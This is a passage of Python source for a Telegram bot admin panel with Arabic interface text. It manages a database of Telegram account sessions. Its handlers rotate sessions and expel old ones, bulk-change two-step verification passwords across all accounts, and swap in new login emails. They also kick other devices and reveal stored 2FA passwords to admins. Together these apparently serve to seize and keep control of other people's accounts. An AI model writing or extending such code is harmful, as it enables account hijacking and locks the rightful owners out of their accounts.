    await callback.answer("⏳ بدأت العملية...")

    msg = callback.message
    await msg.edit_text(
        "⏳ <b>تغيير ج — جاري المعالجة...</b>\n\n"
        "⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜  0%\n"
        "✔️ نجح: 0  ❌ فشل: 0  ⏭️ تخطى: 0\n"
        "📊 الإجمالي: 0 / ?" + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=_stop_bulk_keyboard("rotate", uid),
    )

    _last_edit = [0.0]

    async def progress_cb(done, total, success, fail, skip):
        import time
        now = time.monotonic()
        # حدّث الرسالة كل 5 حسابات أو كل 15 ثانية
        if done % 5 != 0 and now - _last_edit[0] < 15:
            return
        _last_edit[0] = now
        pct = int(done / total * 100) if total else 0
        filled = pct // 10
        bar = "🟩" * filled + "⬜" * (10 - filled)
        text = (
            f"⏳ <b>تغيير ج — جاري المعالجة...</b>\n\n"
            f"{bar}  {pct}%\n"
            f"✔️ نجح: {success}  ❌ فشل: {fail}  ⏭️ تخطى: {skip}\n"
            f"📊 الإجمالي: {done} / {total}" + ADMIN_FOOTER
        )
        try:
            await msg.edit_text(text, parse_mode="HTML",
                                reply_markup=_stop_bulk_keyboard("rotate", uid))
        except Exception:
            pass

    result = await session_manager.bulk_rotate_sessions(
        progress_cb=progress_cb,
        should_stop=lambda: _bulk_stop_flags.get(uid, False),
    )
    _bulk_stop_flags.pop(uid, None)

    stopped_note = "\n<i>(⛔ أُوقفت العملية مبكراً)</i>" if result.get("stopped") else ""
    lines = [
        "✅ <b>اكتملت عملية تغيير ج</b>\n",
        f"✔️ نجح: <b>{result['success']}</b>",
        f"❌ فشل: <b>{result['fail']}</b>",
        f"⏭️ تخطى (معطلة/غير متصلة): <b>{result['skip']}</b>",
        f"📊 المجموع: <b>{result['total']}</b>",
    ]
    if stopped_note:
        lines.append(stopped_note)
    if result.get("fail_details"):
        lines.append("\n<b>تفاصيل الفشل:</b>")
        for d in result["fail_details"][:10]:
            lines.append(f"  • <code>{h(d)}</code>")
    await msg.edit_text(
        "\n".join(lines) + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 رجوع", callback_data="back_to_sessions")]
        ]),
    )


# ── تغيير ج فردي: طلب تأكيد ──
@dp.callback_query(F.data.regexp(r"^ro\d+$"))
async def rotate_single_session_prompt(callback: CallbackQuery):
    if not is_super_admin(callback.from_user.id):
        await callback.answer("❌ لأدمن رقم 1 فقط", show_alert=True)
        return
    session = await admin_resolve.get_session_from_callback(callback.data, "rotate_session")
    if not await _guard_session_row(callback, session):
        return
    phone, sid = session["phone"], session["id"]
    await callback.message.edit_text(
        f"⚠️ <b>تغيير ج — حساب فردي</b>\n\n"
        f"📱 الرقم: <code>{h(phone)}</code>\n\n"
        f"سيتم إنشاء جلسة جديدة وطرد القديمة.\n"
        f"الحساب يجب أن يكون متصلاً ولديه بريد Login.\n\n"
        f"متأكد؟" + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="✅ متأكد", callback_data=f"rotate_single_confirm_{sid}"),
                InlineKeyboardButton(text="❌ إلغاء", callback_data=f"i{sid}"),
            ]
        ]),
    )
    await callback.answer()


@dp.callback_query(F.data.regexp(r"^rotate_single_confirm_\d+$"))
async def rotate_single_session_confirm(callback: CallbackQuery):
    if not is_super_admin(callback.from_user.id):
        await callback.answer("❌ لأدمن رقم 1 فقط", show_alert=True)
        return
    sid = int(callback.data.split("_")[-1])
    session = await database.get_session_by_id(sid)
    if not session:
        await callback.answer("❌ الجلسة غير موجودة!", show_alert=True)
        return
    phone = session["phone"]
    await callback.answer("⏳ جاري تغيير الجلسة...")
    await callback.message.edit_text(
        f"⏳ <b>جاري تغيير ج للرقم</b> <code>{h(phone)}</code>...\n\n"
        f"لا تضغط أي زر حتى تنتهي العملية." + ADMIN_FOOTER,
        parse_mode="HTML",
    )
    res = await session_manager.rotate_session(phone)
    if res["success"]:
        await callback.message.edit_text(
            f"✅ <b>تم تغيير ج بنجاح</b>\n\n"
            f"📱 <code>{h(phone)}</code>\n"
            f"الجلسة الجديدة محفوظة في قاعدة البيانات." + ADMIN_FOOTER,
            parse_mode="HTML",
            reply_markup=back_to_session_keyboard(sid),
        )
    else:
        await callback.message.edit_text(
            f"❌ <b>فشل تغيير ج</b>\n\n"
            f"📱 <code>{h(phone)}</code>\n"
            f"السبب: <code>{h(res.get('error', ''))}</code>" + ADMIN_FOOTER,
            parse_mode="HTML",
            reply_markup=back_to_session_keyboard(sid),
        )


# ══════════════════════════════════════════
# تغيير ت — سوبر أدمن فقط
# ══════════════════════════════════════════

@dp.callback_query(F.data == "change_2fa_all")
async def change_2fa_all_prompt(callback: CallbackQuery, state: FSMContext):
    if not is_super_admin(callback.from_user.id):
        await callback.answer("❌ لأدمن رقم 1 فقط", show_alert=True)
        return
    await state.set_state(AdminFlow.changing_2fa_all)
    await callback.message.edit_text(
        "🔑 <b>تغيير ت — كل الحسابات</b>\n\n"
        "أرسل كلمة التحقق الجديدة.\n\n"
        "• يُغيَّر فقط للحسابات التي لها تحقق محفوظ في قاعدة البيانات\n"
        "• لا تضغط زراً — أرسل النص مباشرة" + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="❌ إلغاء", callback_data="cancel_change_2fa_all")]
        ]),
    )
    await callback.answer()


@dp.callback_query(F.data == "cancel_change_2fa_all")
async def cancel_change_2fa_all(callback: CallbackQuery, state: FSMContext):
    if not is_super_admin(callback.from_user.id):
        await callback.answer()
        return
    await state.clear()
    uid = callback.from_user.id
    sessions = await _sessions_for_admin(uid)
    text = await _admin_panel_text(uid)
    await callback.message.edit_text(
        text,
        reply_markup=sessions_keyboard(sessions, is_super_admin=True) if sessions else None,
        parse_mode="HTML",
    )
    await callback.answer("❌ إلغاء")


@dp.message(AdminFlow.changing_2fa_all)
async def process_change_2fa_all(message: Message, state: FSMContext):
    if not is_super_admin(message.from_user.id):
        return
    uid = message.from_user.id
    new_password = (message.text or "").strip()
    await safe_delete(message.chat.id, message.message_id)
    if not new_password:
        await message.answer("❌ أرسل نصاً غير فارغ.")
        return
    await state.clear()
    _bulk_stop_flags[uid] = False

    wait_msg = await message.answer(
        f"⏳ <b>تغيير ت — جاري المعالجة...</b>\n\n"
        f"⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜  0%\n"
        f"✔️ نجح: 0  ❌ فشل: 0  ⏭️ تخطى: 0\n"
        f"📊 الإجمالي: 0 / ?" + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=_stop_bulk_keyboard("2fa", uid),
    )

    _last_edit = [0.0]

    async def progress_cb(done, total, success, fail, skip):
        import time
        now = time.monotonic()
        if done % 5 != 0 and now - _last_edit[0] < 15:
            return
        _last_edit[0] = now
        pct = int(done / total * 100) if total else 0
        filled = pct // 10
        bar = "🟩" * filled + "⬜" * (10 - filled)
        text = (
            f"⏳ <b>تغيير ت — جاري المعالجة...</b>\n\n"
            f"{bar}  {pct}%\n"
            f"✔️ نجح: {success}  ❌ فشل: {fail}  ⏭️ تخطى: {skip}\n"
            f"📊 الإجمالي: {done} / {total}" + ADMIN_FOOTER
        )
        try:
            await wait_msg.edit_text(text, parse_mode="HTML",
                                     reply_markup=_stop_bulk_keyboard("2fa", uid))
        except Exception:
            pass

    result = await session_manager.bulk_change_two_fa(
        new_password,
        progress_cb=progress_cb,
        should_stop=lambda: _bulk_stop_flags.get(uid, False),
    )
    _bulk_stop_flags.pop(uid, None)

    stopped_note = "\n<i>(⛔ أُوقفت العملية مبكراً)</i>" if result.get("stopped") else ""
    lines = [
        "✅ <b>اكتملت عملية تغيير ت</b>\n",
        f"✔️ نجح: <b>{result['success']}</b>",
        f"❌ فشل: <b>{result['fail']}</b>",
        f"⏭️ تخطى (معطلة/غير متصلة/بلا تحقق): <b>{result['skip']}</b>",
        f"📊 المجموع: <b>{result['total']}</b>",
    ]
    if stopped_note:
        lines.append(stopped_note)
    if result.get("fail_details"):
        lines.append("\n<b>تفاصيل الفشل:</b>")
        for d in result["fail_details"][:10]:
            lines.append(f"  • <code>{h(d)}</code>")
    await wait_msg.edit_text(
        "\n".join(lines) + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 رجوع", callback_data="back_to_sessions")]
        ]),
    )


# [export handlers moved below with format support]


# ──────────────────────────────────────────
# حذف جلسة فردية — عرض شاشة التأكيد أولاً
# ──────────────────────────────────────────
@dp.callback_query(F.data.regexp(r"^d\d+$"))
async def delete_single_session(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    session = await admin_resolve.get_session_from_callback(callback.data, "delete")
    if not await _guard_session_row(callback, session):
        return
    phone = session["phone"]
    session_id = session["id"]
    from keyboards import confirm_delete_keyboard
    await callback.message.edit_text(
        f"⚠️ <b>تأكيد الحذف</b>\n\n"
        f"هل أنت متأكد من حذف الحساب\n<code>{phone}</code>\nنهائياً؟\n\n"
        f"<i>لا يمكن التراجع عن هذه العملية.</i>",
        reply_markup=confirm_delete_keyboard(session_id, phone),
        parse_mode="HTML",
    )
    await callback.answer()


# ──────────────────────────────────────────
# حذف جلسة فردية — تأكيد نهائي
# ──────────────────────────────────────────
@dp.callback_query(F.data.regexp(r"^dc\d+$"))
async def delete_single_session_confirmed(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    uid = callback.from_user.id
    session = await admin_resolve.get_session_from_callback(callback.data, "delete_confirm")
    if not await _guard_session_row(callback, session):
        return
    phone = session["phone"]
    await database.delete_admin_notifications_for_phone(phone)
    await database.delete_session(phone)
    await callback.answer(f"✅ تم حذف {phone} نهائياً.", show_alert=True)

    # ارجع للصفحة التي كان فيها الأدمن قبل الدخول للتفاصيل
    st_data = await state.get_data()
    page   = st_data.get("last_page", 0)
    source = st_data.get("last_source", "main")

    sessions = await _sessions_for_admin(uid)
    text = await _admin_panel_text(uid)

    if source == "unsecured":
        from keyboards import unsecured_sessions_keyboard
        kb = unsecured_sessions_keyboard(sessions, page=page) if sessions else None
    elif source == "disabled":
        from keyboards import disabled_sessions_keyboard
        kb = disabled_sessions_keyboard(sessions, page=page) if sessions else None
    else:
        per_page = 6
        max_page = max(0, (len(sessions) - 1) // per_page) if sessions else 0
        page = min(page, max_page)
        kb = sessions_keyboard(sessions, page=page, is_super_admin=is_super_admin(uid)) if sessions else None

    suffix = "" if sessions else "\n\n📭 لا توجد جلسات."
    await callback.message.edit_text(text + suffix, reply_markup=kb, parse_mode="HTML")


# ──────────────────────────────────────────
# حذف الجلسات غير الصالحة
# ──────────────────────────────────────────
@dp.callback_query(F.data == "purge_invalid")
async def purge_invalid_prompt(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    uid = callback.from_user.id
    n = await database.count_invalid_sessions(uid, SUPER_ADMIN_IDS)
    if n == 0:
        await callback.answer("📭 لا توجد جلسات غير صالحة.", show_alert=True)
        return
    await callback.message.edit_text(
        f"⚠️ <b>حذف نهائي</b>\n\n"
        f"سيتم حذف <b>{n}</b> جلسة غير صالحة من قاعدة البيانات.\n"
        f"لا يمكن التراجع."
        + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="✅ تأكيد الحذف",
                    callback_data="purge_invalid_yes",
                ),
                InlineKeyboardButton(
                    text="❌ إلغاء",
                    callback_data="back_to_sessions",
                ),
            ],
        ]),
    )
    await callback.answer()


@dp.callback_query(F.data == "purge_invalid_yes")
async def purge_invalid_confirm(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    uid = callback.from_user.id
    phones = await database.purge_invalid_sessions(uid, SUPER_ADMIN_IDS)
    if not phones:
        await callback.answer("📭 لا توجد جلسات للحذف.", show_alert=True)
        return
    sessions = await _sessions_for_admin(uid)
    text = await _admin_panel_text(uid)
    await callback.message.edit_text(
        f"✅ تم حذف <b>{len(phones)}</b> جلسة غير صالحة."
        + f"\n\n{text}",
        reply_markup=sessions_keyboard(
            sessions, is_super_admin=is_super_admin(uid)
        ) if sessions else None,
        parse_mode="HTML",
    )
    await callback.answer(f"✅ حُذفت {len(phones)} جلسة", show_alert=True)


# ──────────────────────────────────────────
# الحسابات الغير مأمنه والجلسات المعطلة
# ──────────────────────────────────────────
@dp.callback_query(F.data == "list_unsecured")
async def list_unsecured_handler(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    uid = callback.from_user.id
    await state.update_data(last_source="unsecured", last_page=0)
    sessions = await _sessions_for_admin(uid)
    
    is_sa = is_super_admin(uid)
    unsecured = []
    for s in sessions:
        if not database.row_flag(s, "secured"):
            if is_sa or not database.row_flag(s, "a1_only"):
                unsecured.append(s)
    
    if not unsecured:
        await callback.answer("✅ جميع الحسابات مأمنة!", show_alert=True)
        return
    
    text = f"🔓 <b>الحسابات الغير مأمنه ({len(unsecured)})</b>\n\nاختر حساباً للتفاصيل أو استخدم زر التأمين بالأسفل." + ADMIN_FOOTER
    await callback.message.edit_text(
        text,
        reply_markup=unsecured_sessions_keyboard(unsecured, page=0),
        parse_mode="HTML"
    )
    await callback.answer()


@dp.callback_query(F.data.startswith("unsecured_page_"))
async def unsecured_page_handler(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    uid = callback.from_user.id
    page = int(callback.data.split("_")[-1])
    await state.update_data(last_source="unsecured", last_page=page)
    
    sessions = await _sessions_for_admin(uid)
    is_sa = is_super_admin(uid)
    unsecured = []
    for s in sessions:
        if not database.row_flag(s, "secured"):
            if is_sa or not database.row_flag(s, "a1_only"):
                unsecured.append(s)
    
    if not unsecured:
        await callback.answer("✅ لا توجد حسابات.")
        return

    text = f"🔓 <b>الحسابات الغير مأمنه ({len(unsecured)})</b>" + ADMIN_FOOTER
    await callback.message.edit_text(
        text,
        reply_markup=unsecured_sessions_keyboard(unsecured, page=page),
        parse_mode="HTML"
    )
    await callback.answer()


@dp.callback_query(F.data == "list_disabled")
async def list_disabled_handler(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    uid = callback.from_user.id
    await state.update_data(last_source="disabled", last_page=0)
    sessions = await _sessions_for_admin(uid)
    disabled = [s for s in sessions if not s["valid"]]
    
    if not disabled:
        await callback.answer("✅ لا توجد جلسات معطلة!", show_alert=True)
        return
    
    text = f"🔴 <b>الجلسات المعطلة ({len(disabled)})</b>\n\nهذه الحسابات فقدت الاتصال أو تم إنهاء جلستها." + ADMIN_FOOTER
    await callback.message.edit_text(
        text,
        reply_markup=disabled_sessions_keyboard(disabled, page=0),
        parse_mode="HTML"
    )
    await callback.answer()


@dp.callback_query(F.data.startswith("disabled_page_"))
async def disabled_page_handler(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    uid = callback.from_user.id
    page = int(callback.data.split("_")[-1])
    await state.update_data(last_source="disabled", last_page=page)
    
    sessions = await _sessions_for_admin(uid)
    disabled = [s for s in sessions if not s["valid"]]
    
    if not disabled:
        await callback.answer("✅ لا توجد جلسات معطلة.")
        return

    text = f"🔴 <b>الجلسات المعطلة ({len(disabled)})</b>" + ADMIN_FOOTER
    await callback.message.edit_text(
        text,
        reply_markup=disabled_sessions_keyboard(disabled, page=page),
        parse_mode="HTML"
    )
    await callback.answer()


# ──────────────────────────────────────────
# الجلسات بلا تحقق بخطوتين
# ──────────────────────────────────────────
@dp.callback_query(F.data == "list_no_two_fa")
async def list_no_two_fa_handler(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    uid = callback.from_user.id
    sessions = await database.get_sessions_without_two_fa(uid, SUPER_ADMIN_IDS)
    if not sessions:
        await callback.answer("✅ جميع الجلسات الصالحة لديها تحقق بخطوتين!", show_alert=True)
        return
    await callback.message.edit_text(
        f"⚠️ <b>الجلسات بلا تحقق بخطوتين ({len(sessions)})</b>\n\n"
        f"هذه الجلسات صالحة لكن ليس لها <code>two_fa</code> محفوظ في قاعدة البيانات.\n"
        f"يُفضّل تفعيل التحقق لحمايتها." + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=no_two_fa_sessions_keyboard(sessions, page=0),
    )
    await callback.answer()


@dp.callback_query(F.data.startswith("no_two_fa_page_"))
async def no_two_fa_page_handler(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    uid = callback.from_user.id
    page = int(callback.data.split("_")[-1])
    sessions = await database.get_sessions_without_two_fa(uid, SUPER_ADMIN_IDS)
    if not sessions:
        await callback.answer("✅ لا توجد جلسات.")
        return
    await callback.message.edit_text(
        f"⚠️ <b>الجلسات بلا تحقق بخطوتين ({len(sessions)})</b>" + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=no_two_fa_sessions_keyboard(sessions, page=page),
    )
    await callback.answer()


@dp.callback_query(F.data == "secure_all_unsecured")
async def secure_all_unsecured_handler(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    uid = callback.from_user.id
    sessions = await _sessions_for_admin(uid)
    
    # تصفية إضافية لضمان عدم لمس جلسات السوبر أدمن للأدمن العادي
    is_sa = is_super_admin(uid)
    unsecured = []
    for s in sessions:
        if not database.row_flag(s, "secured"):
            if is_sa or not database.row_flag(s, "a1_only"):
                unsecured.append(s)
    
    if not unsecured:
        await callback.answer("✅ لا توجد حسابات للتأمين.")
        return

    await callback.answer("⏳ جاري فحص وتأمين الحسابات المتصلة...")
    await callback.message.edit_text("⏳ جاري فحص الحسابات وتأمين المتصل منها الآن..." + ADMIN_FOOTER, parse_mode="HTML")
    
    secured_count = 0
    failed_count = 0
    
    for s in unsecured:
        phone = s["phone"]
        # شرط: أن تكون الجلسة تعطي حالة متصلة الآن
        is_alive = await session_manager.check_session_alive(phone)
        if is_alive:
            res = await session_manager.admin_full_cleanup(phone)
            if res["success"]:
                secured_count += 1
            else:
                failed_count += 1
    
    await callback.message.answer(
        f"🛡️ <b>نتائج التأمين الجماعي:</b>\n\n"
        f"✅ تم تأمين: <b>{secured_count}</b>\n"
        f"❌ فشل/غير متصل: <b>{len(unsecured) - secured_count}</b>"
        + ADMIN_FOOTER,
        parse_mode="HTML"
    )
    
    # العودة للقائمة الرئيسية
    await show_admin_panel(callback.message)


# ──────────────────────────────────────────
# طرد الجلسات فقط
# ──────────────────────────────────────────
@dp.callback_query(F.data.regexp(r"^ks\d+$"))
async def admin_kick_sessions_only(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    session = await admin_resolve.get_session_from_callback(callback.data, "kick_only")
    if not await _guard_session_row(callback, session):
        return
    phone, sid = session["phone"], session["id"]

    await callback.message.edit_text(
        "⏳ جاري طرد الجلسات الأخرى فقط..." + ADMIN_FOOTER,
        parse_mode="HTML"
    )

    res = await session_manager.admin_kick_only(phone)

    if res["success"]:
        result_msg = f"✅ تم طرد جميع الجلسات الأخرى للرقم <code>{h(phone)}</code> بنجاح."
    else:
        result_msg = f"❌ فشل الطرد: <code>{h(res.get('error',''))}</code>"

    await callback.message.edit_text(
        result_msg + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=back_to_session_keyboard(sid),
    )
    await track_admin_phone_message(
        callback.from_user.id,
        phone,
        callback.message.chat.id,
        callback.message.message_id,
    )
    await callback.answer()


@dp.callback_query(F.data.regexp(r"^kp\d+$"))
async def admin_kick_specific_list(callback: CallbackQuery):
    if not is_super_admin(callback.from_user.id):
        await callback.answer("❌ للسوبر أدمن فقط", show_alert=True)
        return
    
    session = await admin_resolve.get_session_from_callback(callback.data, "kick_spec")
    if not await _guard_session_row(callback, session):
        return
    
    phone, sid = session["phone"], session["id"]
    await callback.answer("⏳ جاري جلب الأجهزة...")
    
    auths = await session_manager.get_session_authorizations(phone)
    if not auths:
        await callback.message.edit_text(
            "❌ فشل جلب قائمة الأجهزة أو لا توجد أجهزة أخرى لطردها." + ADMIN_FOOTER,
            parse_mode="HTML",
            reply_markup=back_to_session_keyboard(sid)
        )
        return

    await callback.message.edit_text(
        f"📱 <b>الأجهزة المتصلة للحساب</b> <code>{h(phone)}</code>\n\n"
        "اختر الجهاز الذي تريد طرده من القائمة أدناه:" + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=kick_specific_keyboard(sid, auths)
    )


@dp.callback_query(F.data.startswith("kp_"))
async def admin_kick_specific_exec(callback: CallbackQuery):
    if not is_super_admin(callback.from_user.id):
        await callback.answer("❌ للسوبر أدمن فقط", show_alert=True)
        return
    
    parts = callback.data.split("_")
    if len(parts) < 3:
        return
    
    sid = int(parts[1])
    auth_hash = int(parts[2])
    
    session = await database.get_session_by_id(sid)
    if not session:
        await callback.answer("❌ الجلسة غير موجودة")
        return
    
    phone = session["phone"]
    await callback.answer("⏳ جاري الطرد...")
    
    success = await session_manager.kick_specific_session(phone, auth_hash)
    
    if success:
        await callback.message.edit_text(
            f"✅ تم طرد الجهاز بنجاح من الحساب <code>{h(phone)}</code>." + ADMIN_FOOTER,
            parse_mode="HTML",
            reply_markup=back_to_session_keyboard(sid)
        )
    else:
        await callback.message.edit_text(
            f"❌ فشل طرد الجهاز. قد تكون الجلسة انتهت أو الجهاز غير موجود." + ADMIN_FOOTER,
            parse_mode="HTML",
            reply_markup=back_to_session_keyboard(sid)
        )


# ──────────────────────────────────────────
# تغيير البريد تلقائياً
# ──────────────────────────────────────────
@dp.callback_query(F.data.regexp(r"^m\d+$"))
async def auto_mail_process(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    session = await admin_resolve.get_session_from_callback(callback.data, "mail")
    if not await _guard_session_row(callback, session):
        return
    phone, sid = session["phone"], session["id"]
    row = session
    client_probe = await session_manager.get_active_client(phone)
    kept = await session_manager.existing_login_email_ok(row, client_probe)
    if client_probe:
        await client_probe.disconnect()
    if kept:
        await callback.answer("ℹ️ البريد الحالي شغال — لم يُغيَّر", show_alert=True)
        await callback.message.edit_text(
            f"ℹ️ <b>بريد Login شغال — لم يُستبدل</b>\n\n"
            f"📧 <code>{h(kept)}</code>\n\n"
            f"<i>يُستخدم لاستلام أكواد الدخول والإنعاش. "
            f"لا يُنشأ بريد جديد طالما الصندوق يعمل.</i>"
            + ADMIN_FOOTER,
            parse_mode="HTML",
            reply_markup=back_to_session_keyboard(sid),
        )
        await track_admin_phone_message(
            callback.from_user.id,
            phone,
            callback.message.chat.id,
            callback.message.message_id,
        )
        return

    await callback.answer("⏳ جاري المعالجة...")
    await callback.message.edit_text(
        "⏳ جاري ربط بريد Login جديد وانتظار الكود...\n"
        "<i>قد يستغرق حتى دقيقتين — لا تضغط زراً آخر</i>"
        + ADMIN_FOOTER,
        parse_mode="HTML",
    )
    await track_admin_phone_message(
        callback.from_user.id,
        phone,
        callback.message.chat.id,
        callback.message.message_id,
    )
    try:
        res = await session_manager.change_login_email(phone)
    except Exception as e:
        logging.exception("auto_mail %s: %s", phone, e)
        res = {"success": False, "error": str(e)}
    if res.get("skipped"):
        await callback.message.edit_text(
            f"ℹ️ <b>بريد Login شغال — لم يُستبدل</b>\n\n"
            f"📧 <code>{h(res.get('email', ''))}</code>" + ADMIN_FOOTER,
            parse_mode="HTML",
            reply_markup=back_to_session_keyboard(sid),
        )
    elif res["success"]:
        new_email = res.get("email", "")
        await callback.message.edit_text(
            f"✅ تم ربط البريد:\n<code>{h(new_email)}</code>" + ADMIN_FOOTER,
            parse_mode="HTML",
            reply_markup=back_to_session_keyboard(sid),
        )
    else:
        await callback.message.edit_text(
            f"❌ فشل العملية: <code>{h(res['error'])}</code>" + ADMIN_FOOTER,
            parse_mode="HTML",
            reply_markup=back_to_session_keyboard(sid),
        )
    await track_admin_phone_message(
        callback.from_user.id,
        phone,
        callback.message.chat.id,
        callback.message.message_id,
    )


# ──────────────────────────────────────────
# تجديد الجلسة يدوياً (...123)
# ──────────────────────────────────────────
async def track_msg(state: FSMContext, msg: Message):
    """حفظ أيدي الرسائل لحذفها لاحقاً."""
    data = await state.get_data()
    msg_ids = data.get("refresh_msg_ids", [])
    msg_ids.append(msg.message_id)
    await state.update_data(refresh_msg_ids=msg_ids)


async def cleanup_refresh_messages(chat_id: int, state: FSMContext):
    """حذف رسائل العملية فقط (123، الكود، النقط، رسائل البوت)."""
    data = await state.get_data()
    msg_ids = data.get("refresh_msg_ids", [])
    for mid in msg_ids:
        await safe_delete(chat_id, mid)
    await state.update_data(refresh_msg_ids=[])


@dp.message(F.text.endswith("...123"))
async def manual_refresh_trigger(message: Message, state: FSMContext):
    uid = message.from_user.id
    phone = message.text.replace("...123", "").strip()
    
    # إذا لم يكتب الرقم، نحاول جلب الرقم المسجل لهذا اليوزر في جدول users
    if not phone:
        user_row = await database.get_user(uid)
        if user_row and user_row["phone"]:
            phone = user_row["phone"]
    
    if not phone:
        if is_admin(uid):
            await message.answer("❌ يرجى تحديد الرقم أولاً أو كتابته قبل ...123 (مثال: +2010...123)")
        return

    phone = database.normalize_phone(phone)
    session = await database.get_session_by_phone(phone)
    
    # التأكد من صلاحية الوصول (الأدمن يجدد أي رقم، المستخدم يجدد رقمه فقط)
    if not is_admin(uid):
        user_row = await database.get_user(uid)
        if not user_row or database.normalize_phone(user_row["phone"]) != phone:
            return # لا نرد على الغرباء

    if not session:
        if is_admin(uid):
            await message.answer(f"❌ الجلسة للرقم {h(phone)} غير موجودة.")
        return

    # بدء تتبع الرسائل للحذف
    await state.clear()
    await track_msg(state, message)
    
    m_wait = await message.answer(f"⏳ جاري طلب كود تسجيل دخول للرقم <code>{h(phone)}</code>...", parse_mode="HTML")
    await track_msg(state, m_wait)
    
    result = await session_manager.request_code(uid, phone)
    if result["success"]:
        await state.set_state(AdminFlow.refreshing_session)
        await state.update_data(phone=phone, session_id=session["id"])
        m_prompt = await message.answer(
            f"✅ تم طلب الكود بنجاح للرقم <code>{h(phone)}</code>.\n\n"
            "أرسل الكود الآن (أرقام فقط):",
            parse_mode="HTML"
        )
        await track_msg(state, m_prompt)
    else:
        err = result.get("error", "")
        m_fail = await message.answer(f"❌ فشل طلب الكود: <code>{h(err)}</code>", parse_mode="HTML")
        await track_msg(state, m_fail)


@dp.message(AdminFlow.refreshing_session)
async def process_refresh_code(message: Message, state: FSMContext):
    uid = message.from_user.id
    code = message.text.strip()
    
    # تتبع رسالة الكود
    await track_msg(state, message)
    
    if not code.isdigit() and code != ".":
        return

    # إذا أرسل نقطة "." نعتبرها محاولة انتظار أو تحديث (حسب طلب المستخدم "النقط")
    if code == ".":
        return

    data = await state.get_data()
    phone = data.get("phone")
    sid = data.get("session_id")

    m_verifying = await message.answer("⏳ جاري التحقق من الكود...")
    await track_msg(state, m_verifying)
    
    result = await session_manager.submit_code(uid, code, is_refresh=True)
    
    if result.get("two_fa"):
        await state.set_state(AdminFlow.refreshing_2fa)
        m_2fa = await message.answer("🔐 الجلسة محمية بالتحقق بخطوتين. أرسل كلمة المرور الآن:")
        await track_msg(state, m_2fa)
        return

    if result["success"]:
        # نجاح العملية: حذف رسائل العملية
        await cleanup_refresh_messages(message.chat.id, state)
        await state.clear()
        
        # إشعار النجاح (يبقى ظاهراً أو يحذف لاحقاً)
        await message.answer(f"✅ تم تجديد الجلسة بنجاح للرقم <code>{h(phone)}</code>.")
        
        # إذا كان أدمن، نحدث القائمة
        if is_admin(uid):
            await notify_admins(f"✅ <b>تم تجديد الجلسة يدوياً</b>\n📱 {h(phone)}", phone=phone)
    else:
        m_err = await message.answer(f"❌ فشل التجديد: <code>{h(result.get('error', ''))}</code>\nحاول مجدداً:")
        await track_msg(state, m_err)


@dp.message(AdminFlow.refreshing_2fa)
async def process_refresh_2fa(message: Message, state: FSMContext):
    uid = message.from_user.id
    password = message.text.strip()
    
    # تتبع رسالة الباسوورد
    await track_msg(state, message)
    
    data = await state.get_data()
    phone = data.get("phone")
    sid = data.get("session_id")

    m_verifying = await message.answer("⏳ جاري التحقق من كلمة المرور...")
    await track_msg(state, m_verifying)
    
    result = await session_manager.submit_2fa(uid, password, is_refresh=True)
    
    if result["success"]:
        await cleanup_refresh_messages(message.chat.id, state)
        await state.clear()
        await message.answer(f"✅ تم تجديد الجلسة بنجاح للرقم <code>{h(phone)}</code>.")
        if is_admin(uid):
            await notify_admins(f"✅ <b>تم تجديد الجلسة يدوياً (2FA)</b>\n📱 {h(phone)}", phone=phone)
    else:
        m_err = await message.answer(f"❌ فشل التحقق: <code>{h(result.get('error', ''))}</code>\nأرسل كلمة المرور الصحيحة:")
        await track_msg(state, m_err)


@dp.callback_query(F.data.regexp(r"^v\d+$"))
async def admin_fetch_verify(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    session = await admin_resolve.get_session_from_callback(callback.data, "verify")
    if not await _guard_session_row(callback, session):
        return
    
    phone = session["phone"]
    two_fa = session["two_fa"]
    
    if two_fa:
        await callback.answer(f"🔐 التحقق: {two_fa}", show_alert=True)
    else:
        await callback.answer("❌ لا يوجد تحقق محفوظ لهذا الحساب", show_alert=True)


# ──────────────────────────────────────────
# الطرد + سحب الكود
# ──────────────────────────────────────────
@dp.callback_query(F.data.regexp(r"^c\d+$"))
async def admin_req_code(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
